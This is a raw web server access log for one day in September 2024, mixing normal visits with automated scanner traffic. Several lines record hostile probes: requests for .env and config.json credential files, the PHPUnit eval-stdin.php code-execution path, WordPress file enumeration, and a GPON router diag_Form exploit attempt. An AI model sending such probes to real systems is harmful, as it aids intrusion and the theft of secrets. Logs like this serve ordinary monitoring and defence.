138.199.18.141 - - [24/Sep/2024:14:15:35 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
15.188.145.220 - - [24/Sep/2024:14:15:35 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
102.129.153.56 - - [24/Sep/2024:14:15:35 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
68.235.45.39 - - [24/Sep/2024:14:15:36 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
68.235.45.39 - - [24/Sep/2024:14:15:36 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
102.129.153.56 - - [24/Sep/2024:14:15:37 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
102.129.153.56 - - [24/Sep/2024:14:15:37 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15"
138.199.18.141 - - [24/Sep/2024:14:15:37 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
68.235.45.39 - - [24/Sep/2024:14:15:37 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0"
15.188.145.220 - - [24/Sep/2024:14:15:37 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
68.235.45.39 - - [24/Sep/2024:14:18:56 +0000] "GET /index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 302 8380 "http://searchngo.online/index.php?route=checkout/cart" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
181.214.206.144 - - [24/Sep/2024:14:25:04 +0000] "GET /index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 302 8383 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
82.64.198.149 - - [24/Sep/2024:14:25:07 +0000] "GET /index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 302 8383 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
149.102.227.87 - - [24/Sep/2024:14:25:09 +0000] "GET /index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 302 8385 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
181.214.206.144 - - [24/Sep/2024:14:27:16 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
181.214.206.144 - - [24/Sep/2024:14:27:20 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
181.214.206.144 - - [24/Sep/2024:14:27:25 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
149.102.227.87 - - [24/Sep/2024:14:27:27 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
149.102.227.87 - - [24/Sep/2024:14:27:27 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
149.102.227.87 - - [24/Sep/2024:14:27:27 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
82.64.198.149 - - [24/Sep/2024:14:27:40 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
82.64.198.149 - - [24/Sep/2024:14:27:50 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3.1 Mobile/15E148 Safari/604.1"
149.102.227.87 - - [24/Sep/2024:14:30:34 +0000] "GET /index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 302 8382 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
50.6.193.106 - - [24/Sep/2024:14:32:30 +0000] "GET /.env HTTP/1.1" 302 8286 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
50.6.193.106 - - [24/Sep/2024:14:32:30 +0000] "POST / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
50.6.193.106 - - [24/Sep/2024:14:32:32 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 47 "-" "python-requests/2.32.3"
149.102.227.87 - - [24/Sep/2024:14:33:04 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
149.102.227.87 - - [24/Sep/2024:14:33:04 +0000] "GET /./themes/pmahomme/img/logo_left.png HTTP/1.1" 200 2713 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
149.102.227.87 - - [24/Sep/2024:14:33:04 +0000] "GET /themes/dot.gif HTTP/1.1" 200 43 "http://searchngo.online/index.php?route=checkout/MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1"
93.174.93.12 - - [24/Sep/2024:15:00:31 +0000] "GET / HTTP/1.0" 302 17798 "-" "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
43.131.44.218 - - [24/Sep/2024:15:02:44 +0000] "GET / HTTP/1.1" 302 8293 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.131.44.218 - - [24/Sep/2024:15:02:45 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://www.searchngo.online" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.171.77 - - [24/Sep/2024:15:03:57 +0000] "GET / HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.171.77 - - [24/Sep/2024:15:03:57 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
103.197.115.47 - - [24/Sep/2024:15:07:00 +0000] "POST /HNAP1/ HTTP/1.0" 400 0 "-" "-"
149.50.103.48 - - [24/Sep/2024:15:25:33 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
77.221.148.157 - - [24/Sep/2024:15:26:58 +0000] "GET / HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:16 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET / HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /xmlrpc.php?rsd HTTP/1.1" 404 27 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET / HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:17 +0000] "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /2018/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50212 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:18 +0000] "GET /media/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:19 +0000] "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:19 +0000] "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:19 +0000] "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:19 +0000] "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1" 302 50227 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.125.205.62 - - [24/Sep/2024:15:29:19 +0000] "" 400 0 "-" "-"
141.98.11.122 - - [24/Sep/2024:15:33:16 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
162.55.132.97 - - [24/Sep/2024:15:34:12 +0000] "GET /robots.txt HTTP/1.1" 200 26 "-" "NetAPI v1"
5.188.87.49 - - [24/Sep/2024:15:41:09 +0000] "GET /.env HTTP/1.1" 302 8292 "-" "Go-http-client/1.1"
152.32.245.93 - - [24/Sep/2024:15:41:31 +0000] "\x16\x03\x01\x01\x17\x01\x00\x01\x13\x03\x03\x07\xDCWMsN\x0F\xD68\x89\x05\xD2?\xAB\x9F\x22B\x0C\x94\xF1\x14\xEF\x0B'%\xD6\xEDW\xB09O\xD7 \xD0\x16\xBE\x13.c3\xBB\xA0y\xD6P\xF6\xE9\xEE\x9E5\xF7\xF2\xE3\x93\x94M)\xFE'j\x0F\x0C\x85\x06\xA3\x004\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x09\x00\x9E\xCC\xA8\xCC\xAA\x003\x00=\x00\x16\xC0" 400 150 "-" "-"
152.32.245.93 - - [24/Sep/2024:15:41:41 +0000] "GET / HTTP/1.1" 302 50506 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
152.32.245.93 - - [24/Sep/2024:15:42:00 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.245.93 - - [24/Sep/2024:15:42:01 +0000] "GET /favicon.ico HTTP/1.1" 200 22486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.245.93 - - [24/Sep/2024:15:42:02 +0000] "GET /robots.txt HTTP/1.1" 200 57 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.245.93 - - [24/Sep/2024:15:42:02 +0000] "GET /sitemap.xml HTTP/1.1" 302 8288 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.245.93 - - [24/Sep/2024:15:42:03 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://5.161.235.50/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
152.32.245.93 - - [24/Sep/2024:15:42:03 +0000] "GET /config.json HTTP/1.1" 302 8284 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
120.85.112.123 - - [24/Sep/2024:15:56:29 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 302 8288 "-" "Hello, World"
120.85.112.123 - - [24/Sep/2024:15:56:30 +0000] "/tmp/gpon80&ipv=0" 400 150 "-" "-"
185.191.126.213 - - [24/Sep/2024:15:59:52 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
167.99.107.57 - - [24/Sep/2024:16:37:22 +0000] "\x00\x0E8)Ig^\xCC\x9F\xEB\x84\x00\x00\x00\x00\x00" 400 150 "-" "-"
149.50.103.48 - - [24/Sep/2024:16:41:50 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
185.191.126.213 - - [24/Sep/2024:16:44:21 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
196.203.237.144 - - [24/Sep/2024:16:44:50 +0000] "GET /admin/login/ HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
196.203.237.144 - - [24/Sep/2024:16:44:50 +0000] "GET / HTTP/1.1" 302 8289 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
79.124.8.107 - - [24/Sep/2024:16:56:42 +0000] "POST /index/login.cgi HTTP/1.1" 302 8289 "https://5.161.235.50:80/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"
79.124.8.107 - - [24/Sep/2024:16:56:42 +0000] "" 400 0 "-" "-"
179.43.133.162 - - [24/Sep/2024:17:02:02 +0000] "CONNECT google.com:443 HTTP/1.1" 400 150 "-" "-"
88.0.90.203 - - [24/Sep/2024:17:15:23 +0000] "GET / HTTP/1.1" 302 8287 "-" "Mozilla/5.0 (Linux; Android 9.0; MI 8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36"
88.0.90.203 - - [24/Sep/2024:17:15:23 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "-" "Mozilla/5.0 (Linux; Android 9.0; MI 8 SE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36"
89.190.156.137 - - [24/Sep/2024:17:21:00 +0000] "GET / HTTP/1.0" 302 50426 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
178.211.139.188 - - [24/Sep/2024:17:32:34 +0000] "GET / HTTP/1.1" 302 8288 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.191.126.213 - - [24/Sep/2024:17:38:54 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
5.8.11.202 - - [24/Sep/2024:18:01:28 +0000] "\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\xC6\x13\x8C\xA4\x1C=\x22\xE1\x1A\x98 \x84\xB4,\x85\xAFn\xE3Y\xBBbhl\xFF(=':\xA9\x82\xD9o\xC8\xA2\xD7\x93\x98\xB4\xEF\x80\xE5\xB9\x90\x00(\xC0" 400 150 "-" "-"
154.213.186.74 - - [24/Sep/2024:18:01:55 +0000] "POST /login HTTP/1.1" 302 50509 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
154.213.186.74 - - [24/Sep/2024:18:01:55 +0000] "" 400 0 "-" "-"
89.190.156.137 - - [24/Sep/2024:18:02:37 +0000] "GET / HTTP/1.0" 302 50426 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
149.50.103.48 - - [24/Sep/2024:18:03:10 +0000] "GET / HTTP/1.1" 302 50509 "-" "-"
170.106.159.160 - - [24/Sep/2024:18:04:25 +0000] "GET / HTTP/1.1" 302 8288 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
170.106.159.160 - - [24/Sep/2024:18:04:26 +0000] "GET /MY2MBI12L0rkxShZDWShQL2MBI12L0rkxShZDWShQL/SIGNKi138z1t64D3gjJBGHL489ON.php HTTP/1.1" 200 863 "http://searchngo.online" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
5.8.11.202 - - [24/Sep/2024:18:07:38 +0000] "GET / HTTP/1.0" 302 50426 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.89 Vivaldi/1.0.94.2 Safari/537.36"
114.160.71.84 - - [24/Sep/2024:18:16:56 +0000] "GET / HTTP/1.1" 302 50510 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/104.0.0.0 Mobile/15E148 Safari/604.1"
